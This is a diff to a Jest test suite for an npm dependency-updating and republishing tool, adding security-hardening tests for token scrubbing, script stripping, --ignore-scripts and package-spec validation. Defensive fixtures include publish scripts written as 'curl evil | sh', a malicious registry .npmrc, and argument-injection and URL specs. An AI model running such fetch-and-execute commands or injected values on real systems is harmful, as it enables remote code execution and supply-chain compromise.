@@ -14,6 +14,7 @@ import {
   it,
   jest,
 } from '@jest/globals';
+import pacote from 'pacote';
 
 import { CompatibilityTester } from '../compatibility-test.mjs';
 import { PackageDiscoverer } from '../cron-discover.mjs';
@@ -270,6 +271,7 @@ describe('depUp class', () => {
       const methods = depup.getProductionInstallMethods();
 
       expect(methods.length).toBeGreaterThan(0);
+
       for (const [command, commandArguments] of methods) {
         expect(command).toBe('npm');
         expect(commandArguments).toContain('--ignore-scripts');
@@ -282,6 +284,7 @@ describe('depUp class', () => {
       const methods = depup.getTestInstallMethods();
 
       expect(methods.length).toBeGreaterThan(0);
+
       for (const [command, commandArguments] of methods) {
         expect(command).toBe('npm');
         expect(commandArguments).toContain('--ignore-scripts');
@@ -414,7 +417,9 @@ describe('depUp class', () => {
         depup.installBuildDeps('/nonexistent/path/xyz123', false);
 
         expect(environmentSpy).toHaveBeenCalledTimes(1);
+
         const builtEnvironment = environmentSpy.mock.results[0].value;
+
         expect(builtEnvironment.NPM_TOKEN).toBeUndefined();
         expect(builtEnvironment.NODE_AUTH_TOKEN).toBeUndefined();
       } finally {
@@ -831,7 +836,10 @@ describe('packageSyncer class -- systemic abort recalibration', () => {
       });
 
       const items = [
-        { check: { updateType: 'version' }, package_: { name: 'pkg-version-ok' } },
+        {
+          check: { updateType: 'version' },
+          package_: { name: 'pkg-version-ok' },
+        },
         {
           check: { updateType: 'version' },
           package_: { name: 'pkg-version-fail' },
@@ -988,7 +996,7 @@ describe('packageSyncer class -- systemic abort recalibration', () => {
   describe('logFailureBreakdown', () => {
     it('does nothing for an empty or undefined array', () => {
       syncer.logFailureBreakdown([]);
-      syncer.logFailureBreakdown(undefined);
+      syncer.logFailureBreakdown();
 
       expect(console.error).not.toHaveBeenCalled();
     });
@@ -8105,9 +8113,11 @@ describe('cron-sync.mjs -- coverage gap fill', () => {
   // ─────────────────────────────────────────────────────────────────
   describe('checkBatches', () => {
     it('returns empty needsUpdate when all packages are up to date', async () => {
-      jestInstance
-        .spyOn(syncer, 'checkNeedsUpdate')
-        .mockResolvedValue({ latestVersion: '1.0.0', skip: false, updateType: null });
+      jestInstance.spyOn(syncer, 'checkNeedsUpdate').mockResolvedValue({
+        latestVersion: '1.0.0',
+        skip: false,
+        updateType: null,
+      });
 
       const packages = [
         { name: 'a', version: '1.0.0' },
@@ -8122,9 +8132,11 @@ describe('cron-sync.mjs -- coverage gap fill', () => {
     });
 
     it('counts skipped packages correctly', async () => {
-      jestInstance
-        .spyOn(syncer, 'checkNeedsUpdate')
-        .mockResolvedValue({ latestVersion: '1.0.0', skip: true, updateType: null });
+      jestInstance.spyOn(syncer, 'checkNeedsUpdate').mockResolvedValue({
+        latestVersion: '1.0.0',
+        skip: true,
+        updateType: null,
+      });
 
       const packages = [{ name: 'a', version: '1.0.0' }];
       syncer.rateLimitDelay = 0;
@@ -8136,9 +8148,11 @@ describe('cron-sync.mjs -- coverage gap fill', () => {
     });
 
     it('collects packages that need updating', async () => {
-      jestInstance
-        .spyOn(syncer, 'checkNeedsUpdate')
-        .mockResolvedValue({ latestVersion: '2.0.0', skip: false, updateType: 'version' });
+      jestInstance.spyOn(syncer, 'checkNeedsUpdate').mockResolvedValue({
+        latestVersion: '2.0.0',
+        skip: false,
+        updateType: 'version',
+      });
 
       const package_ = { name: 'express', version: '1.0.0' };
       syncer.rateLimitDelay = 0;
@@ -8165,14 +8179,16 @@ describe('cron-sync.mjs -- coverage gap fill', () => {
     });
 
     it('processes multiple batches when packages exceed checkConcurrentPackages', async () => {
-      jestInstance
-        .spyOn(syncer, 'checkNeedsUpdate')
-        .mockResolvedValue({ latestVersion: '1.0.0', skip: false, updateType: null });
+      jestInstance.spyOn(syncer, 'checkNeedsUpdate').mockResolvedValue({
+        latestVersion: '1.0.0',
+        skip: false,
+        updateType: null,
+      });
       syncer.checkConcurrentPackages = 2;
       syncer.rateLimitDelay = 0;
 
-      const packages = Array.from({ length: 5 }, (_, i) => ({
-        name: `pkg-${i}`,
+      const packages = Array.from({ length: 5 }, (_, index) => ({
+        name: `pkg-${index}`,
         version: '1.0.0',
       }));
 
@@ -8455,17 +8471,15 @@ describe('cron-sync.mjs -- coverage gap fill', () => {
       jestInstance
         .spyOn(syncer, 'getExistingPackages')
         .mockResolvedValueOnce([{ name: 'express', version: '4.18.2' }]);
-      jestInstance
-        .spyOn(syncer, 'checkBatches')
-        .mockResolvedValueOnce({
-          needsUpdate: [
-            {
-              check: { latestVersion: '5.0.0', updateType: 'version' },
-              package_: { name: 'express', version: '4.18.2' },
-            },
-          ],
-          skippedCount: 0,
-        });
+      jestInstance.spyOn(syncer, 'checkBatches').mockResolvedValueOnce({
+        needsUpdate: [
+          {
+            check: { latestVersion: '5.0.0', updateType: 'version' },
+            package_: { name: 'express', version: '4.18.2' },
+          },
+        ],
+        skippedCount: 0,
+      });
       jestInstance
         .spyOn(syncer, 'applyBatches')
         .mockResolvedValueOnce({ failedCount: 0, syncedPackages: ['express'] });
@@ -8481,17 +8495,15 @@ describe('cron-sync.mjs -- coverage gap fill', () => {
       jestInstance
         .spyOn(syncer, 'getExistingPackages')
         .mockResolvedValueOnce([{ name: 'lodash', version: '4.17.21' }]);
-      jestInstance
-        .spyOn(syncer, 'checkBatches')
-        .mockResolvedValueOnce({
-          needsUpdate: [
-            {
-              check: { latestVersion: '5.0.0', updateType: 'version' },
-              package_: { name: 'lodash', version: '4.17.21' },
-            },
-          ],
-          skippedCount: 0,
-        });
+      jestInstance.spyOn(syncer, 'checkBatches').mockResolvedValueOnce({
+        needsUpdate: [
+          {
+            check: { latestVersion: '5.0.0', updateType: 'version' },
+            package_: { name: 'lodash', version: '4.17.21' },
+          },
+        ],
+        skippedCount: 0,
+      });
       jestInstance
         .spyOn(syncer, 'applyBatches')
         .mockResolvedValueOnce({ failedCount: 0, syncedPackages: ['lodash'] });
@@ -8515,14 +8527,12 @@ describe('cron-sync.mjs -- coverage gap fill', () => {
     });
 
     it('reports zero synced packages when nothing needs updating', async () => {
-      jestInstance
-        .spyOn(syncer, 'getExistingPackages')
-        .mockResolvedValueOnce(
-          Array.from({ length: 7 }, (_, index) => ({
-            name: `pkg-${index}`,
-            version: '1.0.0',
-          })),
-        );
+      jestInstance.spyOn(syncer, 'getExistingPackages').mockResolvedValueOnce(
+        Array.from({ length: 7 }, (_, index) => ({
+          name: `pkg-${index}`,
+          version: '1.0.0',
+        })),
+      );
       jestInstance
         .spyOn(syncer, 'checkBatches')
         .mockResolvedValueOnce({ needsUpdate: [], skippedCount: 0 });
@@ -8558,24 +8568,20 @@ describe('cron-sync.mjs -- coverage gap fill', () => {
     });
 
     it('exits with 1 and logs SYSTEMIC FAILURE when >50% of 10+ attempts fail', async () => {
-      jestInstance
-        .spyOn(syncer, 'getExistingPackages')
-        .mockResolvedValueOnce(
-          Array.from({ length: 12 }, (_, index) => ({
-            name: `fail-pkg-${index}`,
-            version: '1.0.0',
-          })),
-        );
+      jestInstance.spyOn(syncer, 'getExistingPackages').mockResolvedValueOnce(
+        Array.from({ length: 12 }, (_, index) => ({
+          name: `fail-pkg-${index}`,
+          version: '1.0.0',
+        })),
+      );
       // checkBatches returns 12 packages needing update, applyBatches fails all
-      jestInstance
-        .spyOn(syncer, 'checkBatches')
-        .mockResolvedValueOnce({
-          needsUpdate: Array.from({ length: 12 }, (_, index) => ({
-            check: { latestVersion: '2.0.0', updateType: 'version' },
-            package_: { name: `fail-pkg-${index}`, version: '1.0.0' },
-          })),
-          skippedCount: 0,
-        });
+      jestInstance.spyOn(syncer, 'checkBatches').mockResolvedValueOnce({
+        needsUpdate: Array.from({ length: 12 }, (_, index) => ({
+          check: { latestVersion: '2.0.0', updateType: 'version' },
+          package_: { name: `fail-pkg-${index}`, version: '1.0.0' },
+        })),
+        skippedCount: 0,
+      });
       jestInstance.spyOn(syncer, 'applyBatches').mockResolvedValueOnce({
         failedCount: 12,
         failureReasons: [],
@@ -8596,23 +8602,19 @@ describe('cron-sync.mjs -- coverage gap fill', () => {
     });
 
     it('does NOT trigger systemic failure when fewer than 10 packages attempted', async () => {
-      jestInstance
-        .spyOn(syncer, 'getExistingPackages')
-        .mockResolvedValueOnce(
-          Array.from({ length: 3 }, (_, index) => ({
-            name: `small-fail-${index}`,
-            version: '1.0.0',
-          })),
-        );
-      jestInstance
-        .spyOn(syncer, 'checkBatches')
-        .mockResolvedValueOnce({
-          needsUpdate: Array.from({ length: 3 }, (_, index) => ({
-            check: { latestVersion: '2.0.0', updateType: 'version' },
-            package_: { name: `small-fail-${index}`, version: '1.0.0' },
-          })),
-          skippedCount: 0,
-        });
+      jestInstance.spyOn(syncer, 'getExistingPackages').mockResolvedValueOnce(
+        Array.from({ length: 3 }, (_, index) => ({
+          name: `small-fail-${index}`,
+          version: '1.0.0',
+        })),
+      );
+      jestInstance.spyOn(syncer, 'checkBatches').mockResolvedValueOnce({
+        needsUpdate: Array.from({ length: 3 }, (_, index) => ({
+          check: { latestVersion: '2.0.0', updateType: 'version' },
+          package_: { name: `small-fail-${index}`, version: '1.0.0' },
+        })),
+        skippedCount: 0,
+      });
       jestInstance.spyOn(syncer, 'applyBatches').mockResolvedValueOnce({
         failedCount: 3,
         failureReasons: [],
@@ -11977,7 +11979,7 @@ describe('refresh-curated-list.mjs -- coverage gap fill', () => {
     // Speed up sleep calls (rate-limit delays) -- spy on the instance method
     // instead of globalThis.setTimeout, which is not spyable inside the Jest
     // VM module sandbox on Node 26+.
-    jestInstance.spyOn(refresher, 'sleep').mockResolvedValue(undefined);
+    jestInstance.spyOn(refresher, 'sleep').mockResolvedValue();
   });
 
   afterEach(async () => {
@@ -14954,6 +14956,496 @@ describe('depup.mjs -- coverage gap fill', () => {
       await fs.mkdir(dir);
 
       await depup.cleanupDirectory(dir);
+    });
+  });
+});
+
+describe('depup.mjs -- publish audit hardening', () => {
+  let depup;
+  let tmpDir;
+  const GITHUB_FILE_VARS = [
+    'GITHUB_ENV',
+    'GITHUB_OUTPUT',
+    'GITHUB_PATH',
+    'GITHUB_STATE',
+  ];
+  const TOUCHED_VARS = [
+    'ARGS_FILE',
+    'NODE_AUTH_TOKEN',
+    'NPM_TOKEN',
+    'PATH',
+    ...GITHUB_FILE_VARS,
+  ];
+  let savedEnvironment;
+
+  const publishContext = () => ({
+    baseVersion: '1.0.0',
+    bumpResult: { changes: [], updatedCount: 0 },
+    changesData: { bumped: {}, timestamp: 'ts', totalUpdated: 0 },
+    debug: false,
+    packageDirectory: tmpDir,
+    packageJson: { version: '1.0.0-depup.0' },
+    packageName: 'testpkg',
+    revision: 0,
+    scopedName: '@depup/testpkg',
+    shouldPublish: true,
+    targetDirectory: path.join(tmpDir, 'rev-0'),
+    testResult: 'passed',
+  });
+
+  beforeEach(async () => {
+    const { DepUp } = await import('../depup.mjs');
+    depup = new DepUp();
+    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'depup-audit-'));
+    savedEnvironment = Object.fromEntries(
+      TOUCHED_VARS.map((name) => [name, process.env[name]]),
+    );
+  });
+
+  afterEach(async () => {
+    jest.restoreAllMocks();
+    for (const [name, value] of Object.entries(savedEnvironment)) {
+      if (value === undefined) {
+        delete process.env[name];
+      } else {
+        process.env[name] = value;
+      }
+    }
+    await fs.rm(tmpDir, { force: true, recursive: true });
+  });
+
+  describe('executeImportTest environment', () => {
+    it('does not expose NPM_TOKEN or NODE_AUTH_TOKEN to the child process', async () => {
+      process.env.NPM_TOKEN = 'canary-npm-token';
+      process.env.NODE_AUTH_TOKEN = 'canary-node-auth-token';
+      const testDir = path.join(tmpDir, 'import-env');
+      await fs.mkdir(testDir, { recursive: true });
+      await fs.writeFile(
+        path.join(testDir, 'test.mjs'),
+        [
+          "import { writeFileSync } from 'node:fs';",
+          "writeFileSync('seen.txt', [process.env.NPM_TOKEN ?? 'absent', process.env.NODE_AUTH_TOKEN ?? 'absent'].join('|'));",
+        ].join('\n'),
+      );
+
+      await depup.executeImportTest(testDir, false, 20_000);
+
+      const seen = await fs.readFile(path.join(testDir, 'seen.txt'), 'utf8');
+
+      expect(seen).toBe('absent|absent');
+      expect(process.env.NPM_TOKEN).toBe('canary-npm-token');
+    });
+  });
+
+  describe('buildSanitizedInstallEnvironment GitHub workflow files', () => {
+    it('drops GITHUB_ENV, GITHUB_PATH, GITHUB_OUTPUT and GITHUB_STATE', () => {
+      for (const name of GITHUB_FILE_VARS) {
+        process.env[name] = `/tmp/${name.toLowerCase()}`;
+      }
+
+      const sanitized = depup.buildSanitizedInstallEnvironment();
+
+      for (const name of GITHUB_FILE_VARS) {
+        expect(sanitized[name]).toBeUndefined();
+      }
+
+      expect(sanitized.PATH).toBe(process.env.PATH);
+    });
+
+    it('does not mutate process.env when dropping GITHUB_* vars', () => {
+      for (const name of GITHUB_FILE_VARS) {
+        process.env[name] = `/tmp/${name.toLowerCase()}`;
+      }
+
+      depup.buildSanitizedInstallEnvironment();
+
+      for (const name of GITHUB_FILE_VARS) {
+        expect(process.env[name]).toBe(`/tmp/${name.toLowerCase()}`);
+      }
+    });
+  });
+
+  describe('publish lifecycle hardening', () => {
+    it('preparePackageJson strips publish and postpublish scripts', async () => {
+      const pkgDir = path.join(tmpDir, 'rev-0');
+      await fs.mkdir(pkgDir, { recursive: true });
+      await fs.writeFile(
+        path.join(pkgDir, 'package.json'),
+        JSON.stringify({
+          name: 'testpkg',
+          scripts: {
+            build: 'tsc',
+            postpublish: 'curl evil | sh',
+            publish: 'curl evil | sh',
+          },
+          version: '1.0.0',
+        }),
+      );
+
+      const result = await depup.preparePackageJson(
+        pkgDir,
+        '@depup/testpkg',
+        '1.0.0',
+        0,
+        'testpkg',
+      );
+
+      expect(result.scripts.publish).toBeUndefined();
+      expect(result.scripts.postpublish).toBeUndefined();
+      expect(result.scripts.build).toBe('tsc');
+    });
+
+    it('executePublish passes --ignore-scripts and survives >1 MiB of npm output', async () => {
+      // execFileSync is a named import and cannot be spied on, so put a stub
+      // `npm` first on PATH: it records its argv and prints 2 MiB to stdout.
+      // With the default 1 MiB maxBuffer this would fail with ENOBUFS.
+      const binDir = path.join(tmpDir, 'bin');
+      const argumentsFile = path.join(tmpDir, 'npm-args.txt');
+      await fs.mkdir(binDir, { recursive: true });
+      await fs.writeFile(
+        path.join(binDir, 'npm'),
+        [
+          '#!/bin/sh',
+          String.raw`printf "%s\n" "$@" > "$ARGS_FILE"`,
+          String.raw`head -c 2097152 /dev/zero | tr '\0' 'x'`,
+        ].join('\n'),
+        { mode: 0o755 },
+      );
+      process.env.ARGS_FILE = argumentsFile;
+      process.env.NPM_TOKEN = 'test-token';
+      process.env.PATH = `${binDir}${path.delimiter}${process.env.PATH}`;
+
+      expect(() =>
+        depup.executePublish(tmpDir, '1.0.0-depup.0', false),
+      ).not.toThrow();
+
+      const recordedText = await fs.readFile(argumentsFile, 'utf8');
+      const recorded = recordedText.split('\n');
+
+      expect(recorded).toStrictEqual(
+        expect.arrayContaining([
+          'publish',
+          '--ignore-scripts',
+          '--tag',
+          'latest',
+        ]),
+      );
+    });
+  });
+
+  describe('dependency name validation', () => {
+    const invalidNames = [
+      'foo@http://127.0.0.1:1/x.tgz#',
+      'foo@latest',
+      'http://127.0.0.1:1/x.tgz',
+      'git+https://github.com/a/b.git',
+      'github:a/b',
+      'a/b',
+      '../escape',
+      '__proto__',
+      'constructor',
+      'prototype',
+      '',
+      '@scope',
+      '@scope/name/extra',
+      'has space',
+    ];
+
+    it.each(invalidNames)(
+      'skips invalid dependency name %j without calling pacote',
+      async (depName) => {
+        const manifestSpy = jest
+          .spyOn(pacote, 'manifest')
+          .mockResolvedValue({ version: '9.0.0' });
+
+        const result = await depup.updateSingleDependency(
+          depName,
+          '^1.0.0',
+          { dependencies: { [depName]: '^1.0.0' } },
+          false,
+          5000,
+        );
+
+        expect(result).toStrictEqual({ result: 'skipped' });
+        expect(manifestSpy).not.toHaveBeenCalled();
+      },
+    );
+
+    it('logs a debug message when skipping an invalid name', async () => {
+      const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
+
+      await depup.updateSingleDependency('a/b', '^1.0.0', {}, true, 5000);
+
+      expect(logSpy).toHaveBeenCalledWith(
+        expect.stringContaining('invalid name'),
+      );
+    });
+
+    it.each([
+      'express',
+      '@scope/pkg',
+      'lodash.merge',
+      'JSONStream',
+      '@types/node',
+    ])('still processes valid dependency name %s', async (depName) => {
+      const manifestSpy = jest
+        .spyOn(pacote, 'manifest')
+        .mockResolvedValue({ version: '9.0.0' });
+
+      const result = await depup.updateSingleDependency(
+        depName,
+        '^1.0.0',
+        { dependencies: { [depName]: '^1.0.0' } },
+        false,
+        5000,
+      );
+
+      expect(result.result).toBe('updated');
+      expect(manifestSpy).toHaveBeenCalledWith(`${depName}@latest`);
+    });
+
+    it('writeChangesJson never writes reserved keys into bumped', async () => {
+      const result = await depup.writeChangesJson(
+        {
+          changes: [
+            { depName: '__proto__', from: '^1.0.0', to: '^2.0.0' },
+            { depName: 'constructor', from: '^1.0.0', to: '^2.0.0' },
+            { depName: 'express', from: '^4.0.0', to: '^5.0.0' },
+          ],
+          updatedCount: 3,
+        },
+        tmpDir,
+      );
+
+      expect(Object.keys(result.bumped)).toStrictEqual(['express']);
+      expect(Object.getPrototypeOf(result.bumped)).toBe(Object.prototype);
+      expect(result.totalUpdated).toBe(1);
+    });
+  });
+
+  describe('removeNpmrc', () => {
+    it('removes an existing .npmrc', async () => {
+      await fs.writeFile(path.join(tmpDir, '.npmrc'), 'registry=https://evil');
+
+      await depup.removeNpmrc(tmpDir);
+
+      await expect(fs.access(path.join(tmpDir, '.npmrc'))).rejects.toThrow();
+    });
+
+    it('does not throw when there is no .npmrc', async () => {
+      await expect(depup.removeNpmrc(tmpDir)).resolves.toBeUndefined();
+    });
+
+    it('propagates real removal failures instead of swallowing them', async () => {
+      const failure = Object.assign(
+        new Error('EPERM: operation not permitted'),
+        {
+          code: 'EPERM',
+        },
+      );
+      jest.spyOn(fs, 'rm').mockRejectedValue(failure);
+
+      await expect(depup.removeNpmrc(tmpDir)).rejects.toThrow('EPERM');
+    });
+
+    it('aborts processPackageCore when .npmrc removal fails', async () => {
+      const originalCwd = process.cwd();
+      process.chdir(tmpDir);
+      try {
+        jest.spyOn(depup, 'fetchManifest').mockResolvedValue({
+          name: 'testpkg',
+          version: '1.0.0',
+        });
+        jest.spyOn(depup, 'downloadPackage').mockResolvedValue();
+        jest
+          .spyOn(depup, 'removeNpmrc')
+          .mockRejectedValue(new Error('EBUSY: resource busy'));
+        const prepareSpy = jest.spyOn(depup, 'preparePackageJson');
+        jest.spyOn(console, 'log').mockImplementation(() => {});
+
+        await expect(
+          depup.processPackageCore({
+            packageSpec: 'testpkg',
+            shouldPublish: true,
+            timeout: 1000,
+          }),
+        ).rejects.toThrow('EBUSY');
+        expect(prepareSpy).not.toHaveBeenCalled();
+      } finally {
+        process.chdir(originalCwd);
+      }
+    });
+  });
+
+  describe('package spec validation', () => {
+    const acceptedSpecs = [
+      'express',
+      'lodash.merge',
+      '@types/node',
+      'express@4.18.2',
+      'express@latest',
+      '@scope/name@next',
+      '@scope/name@1.2.3',
+      'name@1.0.0-beta.1+build.5',
+      'name@~1.0.0',
+      'JSONStream@1.3.5',
+    ];
+    const rejectedSpecs = [
+      'https://example.com/pkg.tgz',
+      'http://127.0.0.1:1/x.tgz',
+      'name@https://example.com/pkg.tgz',
+      'git+https://github.com/a/b.git',
+      'git+ssh://git@github.com/a/b.git',
+      'file:../local',
+      'github:user/repo',
+      'gitlab:user/repo',
+      'npm:other@1.0.0',
+      'link:../other',
+      'workspace:*',
+      'user/repo',
+      '/abs/path',
+      './relative',
+      '.hidden',
+      '-rf',
+      '--flag',
+      'foo bar',
+      'foo\tbar',
+      'foo\nbar',
+      'foo\u0000bar',
+      'foo\u007Fbar',
+      '@scope',
+      '@scope/',
+      'name@',
+      'name@1.0.0@2.0.0',
+    ];
+
+    it.each(acceptedSpecs)('accepts registry spec %j', (spec) => {
+      expect(() => depup.validatePackageSpec(spec)).not.toThrow();
+    });
+
+    it.each(rejectedSpecs)('rejects non-registry spec %j', (spec) => {
+      expect(() => depup.validatePackageSpec(spec)).toThrow(
+        'Invalid package spec format',
+      );
+    });
+
+    it('processPackageCore rejects a URL spec before any network call', async () => {
+      const fetchSpy = jest.spyOn(depup, 'fetchManifest');
+
+      await expect(
+        depup.processPackageCore({
+          packageSpec: 'github:user/repo',
+          timeout: 1000,
+        }),
+      ).rejects.toThrow('Invalid package spec format');
+      expect(fetchSpy).not.toHaveBeenCalled();
+    });
+  });
+
+  describe('publishAndFinalize error reporting', () => {
+    it('keeps both publish and finalize errors when both fail', async () => {
+      const publishError = new Error('publish error');
+      const finalizeError = new Error('finalize error');
+      jest.spyOn(depup, 'handlePublishStep').mockRejectedValue(publishError);
+      jest.spyOn(depup, 'finalizePackage').mockRejectedValue(finalizeError);
+
+      const thrown = await depup
+        .publishAndFinalize(publishContext())
+        .catch((error) => error);
+
+      expect(thrown).toBeInstanceOf(AggregateError);
+      expect(thrown.message).toBe(
+        'Publish failed (publish error) and finalization also failed',
+      );
+      expect(thrown.errors).toStrictEqual([publishError, finalizeError]);
+      expect(thrown.cause).toBe(finalizeError);
+    });
+  });
+
+  describe('failure observability', () => {
+    it('executeImportTest warns with a stderr excerpt when the import fails', async () => {
+      const warnSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});
+      const testDir = path.join(tmpDir, 'import-fail');
+      await fs.mkdir(testDir, { recursive: true });
+      await fs.writeFile(
+        path.join(testDir, 'test.mjs'),
+        "console.error('Import failed: Cannot find module boom-detail'); process.exit(1);",
+      );
+
+      await expect(
+        depup.executeImportTest(testDir, false, 20_000),
+      ).rejects.toThrow();
+
+      expect(warnSpy).toHaveBeenCalledTimes(1);
+      expect(String(warnSpy.mock.calls[0][0])).toContain('boom-detail');
+    });
+
+    it('executeImportTest truncates the excerpt to about 500 characters', async () => {
+      const warnSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});
+      const testDir = path.join(tmpDir, 'import-fail-long');
+      await fs.mkdir(testDir, { recursive: true });
+      await fs.writeFile(
+        path.join(testDir, 'test.mjs'),
+        "console.error('a'.repeat(5000)); process.exit(1);",
+      );
+
+      await expect(
+        depup.executeImportTest(testDir, false, 20_000),
+      ).rejects.toThrow();
+
+      const message = String(warnSpy.mock.calls[0][0]);
+
+      expect(message.length).toBeLessThan(600);
+      expect(message).toContain('...');
+    });
+
+    it('executeImportTest does not warn when the import succeeds', async () => {
+      const warnSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});
+      const testDir = path.join(tmpDir, 'import-ok');
+      await fs.mkdir(testDir, { recursive: true });
+      await fs.writeFile(path.join(testDir, 'test.mjs'), 'console.log("ok");');
+
+      await depup.executeImportTest(testDir, false, 20_000);
+
+      expect(warnSpy).not.toHaveBeenCalled();
+    });
+
+    it('tryInstallMethods warns once with a truncated last error when all methods fail', () => {
+      const warnSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});
+      const methods = [
+        ['node', ['-e', 'process.exit(1)']],
+        [
+          'node',
+          ['-e', `console.error("${'z'.repeat(1000)}"); process.exit(2)`],
+        ],
+      ];
+
+      expect(depup.tryInstallMethods(methods, tmpDir, false, 20_000)).toBe(
+        false,
+      );
+
+      expect(warnSpy).toHaveBeenCalledTimes(1);
+
+      const message = String(warnSpy.mock.calls[0][0]);
+
+      expect(message).toContain('All 2 install methods failed');
+      expect(message).toContain('Command failed');
+      expect(message.length).toBeLessThan(400);
+      expect(message).toContain('...');
+    });
+
+    it('tryInstallMethods stays quiet when a later method succeeds', () => {
+      const warnSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});
+      const methods = [
+        ['node', ['-e', 'process.exit(1)']],
+        ['node', ['-e', 'process.exit(0)']],
+      ];
+
+      expect(depup.tryInstallMethods(methods, tmpDir, false, 20_000)).toBe(
+        true,
+      );
+
+      expect(warnSpy).not.toHaveBeenCalled();
     });
   });
 });
